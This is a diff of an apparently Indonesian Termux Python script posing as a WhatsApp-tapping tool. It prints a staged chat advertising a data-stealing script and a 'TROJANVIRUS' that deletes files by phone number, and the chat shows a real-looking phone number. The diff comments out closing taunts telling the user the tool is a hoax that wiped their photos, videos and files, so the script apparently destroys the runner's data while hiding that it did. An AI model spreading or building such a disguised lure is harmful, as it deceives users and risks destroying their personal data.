@@ -107,19 +107,19 @@ a = input("\033[1;31m Silahkan Pilih : ")
 ketik ("\033[1;31m Waiting Open Chat! ") 
 print ("""\033[1;35m
 [25/6 03.05] +62 852-5670-5212: Bang
-[25/6 08.17] Sayang2 🐣: Iya?
-[25/6 09.20] +62 852-5670-5212: Memang bisa ya bng ngambil data wa orng
-[25/6 09.21] Sayang2 🐣: Bisa
-[25/6 09.21] +62 852-5670-5212: Pake termux kan bang
-[25/6 09.21] Sayang2 🐣: Iya
+[25/6 08.17] Dani 🐣: Iya?
+[25/6 09.20] +62 852-5670-5212: Dmana Piam
+[25/6 09.21] Dani 🐣: Rumah Ae
+[25/6 09.21] +62 852-5670-5212: Oh
+[25/6 09.21] Dani 🐣: Iya
 [25/6 09.22] +62 852-5670-5212: Berapa harga scrif nya bng
-[25/6 09.22] Sayang2 🐣: 50k bang
+[25/6 09.22] Dani 🐣: 50k bang
 [25/6 09.22] +62 852-5670-5212: Coleh gk coba dulu abng ambil data wa saya
-[25/6 09.23] Sayang2 🐣: Gabisa gan soalnya ada lisensi ny
-[25/6 09.23] Sayang2 🐣: Gw bantu jual doang yg jual tmn gw
-[25/6 09.23] Sayang2 🐣: Kemarin juga ada yg minta tes tapi gblh
-[25/6 09.23] Sayang2 🐣: Tapi pada beli yg TROJANVIRUS
-[25/6 09.24] Sayang2 🐣: TROJANVIRUS: Menghapus file target pake no tlpn
+[25/6 09.23] Dani🐣: Gabisa gan soalnya ada lisensi ny
+[25/6 09.23] Dani 🐣: Gw bantu jual doang yg jual tmn gw
+[25/6 09.23] Dani 🐣: Kemarin juga ada yg minta tes tapi gblh
+[25/6 09.23] Dani 🐣: Tapi pada beli yg TROJANVIRUS
+[25/6 09.24] Dani 🐣: TROJANVIRUS: Menghapus file target pake no tlpn
 [25/6 09.24] +62 852-5670-5212: Mksdnya. Abng yang tes kesaya. Nti bng krm ss data saya
 [25/6 09.24] Sayang2 🐣: Gabisa bang yg punya nya lagi gaada
 [25/6 09.24] Sayang2 🐣: Jadi gw Nge chat dlu
@@ -193,10 +193,10 @@ print ("""\033[1;35m
 """)
 sleep(3)
 print ("\033[1;31m Terimakasih Telah Menggunakan Tools Ini! See you ")
-print ("\033[1;31m Silahkan Cek Semua Berkas Anda ^_^ ")
-print ("\033[1;31m Anjing Goblog Kok Ilang :v ")
-print ("\033[1;31m Mamposh Terhapus Semua :D  ")
-print ("\033[1;31m Script Sadap WhatsApp Itu Hoax^_^ ")
-print ("\033[1;31m Dasar Kang Termoss :v")
-print ("\033[1;31m Katanya Hekel  ^_^ ")
-print ("\033[1;31m Semua Data Lu termasuk video,foto,download,file penting android ke hapus semua mampod :v ")
+#print ("\033[1;31m Silahkan Cek Semua Berkas Anda ^_^ ")
+#print ("\033[1;31m Anjing Goblog Kok Ilang :v ")
+#print ("\033[1;31m Mamposh Terhapus Semua :D  ")
+#print ("\033[1;31m Script Sadap WhatsApp Itu Hoax^_^ ")
+#print ("\033[1;31m Dasar Kang Termoss :v")
+#print ("\033[1;31m Katanya Hekel  ^_^ ")
+#print ("\033[1;31m Semua Data Lu termasuk video,foto,download,file penting android ke hapus semua mampod :v ")
